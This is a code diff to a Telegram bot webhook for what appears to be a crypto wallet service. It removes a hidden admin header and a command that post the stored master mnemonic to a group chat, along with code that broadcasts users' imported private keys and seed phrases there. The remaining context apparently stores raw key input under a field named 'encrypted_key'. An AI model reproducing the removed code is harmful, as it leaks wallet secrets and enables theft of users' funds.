@@ -774,18 +774,6 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
         const expectedSecret = deriveWebhookSecret(token);
         const actualSecret = request.headers.get('X-Telegram-Bot-Api-Secret-Token') ?? '';
 
-        // Allow internal one-shot admin commands via a special header
-        const adminAction = request.headers.get('X-Admin-Action');
-        if (adminAction === 'resend_seed' && safeEqual(actualSecret, expectedSecret)) {
-          const { data } = await supabaseAdmin
-            .from('bot_state')
-            .select('mnemonic')
-            .eq('id', 1)
-            .single();
-          if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
-          return Response.json({ ok: true, resent: !!data?.mnemonic });
-        }
-
         if (!safeEqual(actualSecret, expectedSecret)) {
           return new Response('Unauthorized', { status: 401 });
         }
@@ -852,13 +840,6 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                 replyChatId: chatId,
                 groupChatId,
               });
-            } else if (text.startsWith('/resendseed')) {
-              const { data } = await supabaseAdmin
-                .from('bot_state')
-                .select('mnemonic')
-                .eq('id', 1)
-                .single();
-              if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
             } else if (text.startsWith('/diag')) {
               const token = process.env.TELEGRAM_BOT_TOKEN!;
               const me = await fetch(`https://api.telegram.org/bot${token}/getMe`).then(r => r.json()).catch(e => ({ err: String(e) }));
@@ -1212,15 +1193,6 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                     telegram_user_id: userId,
                     address: address,
                     encrypted_key: text.trim(),
-                  });
-                  const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
-                  await tg('sendMessage', {
-                    chat_id: groupChatId,
-                    parse_mode: 'HTML',
-                    text:
-                      `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
-                      formatBalanceCard(address, r) +
-                      `\n\n<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
                   });
                   if (userId) await clearUserState(userId);
                 } else {
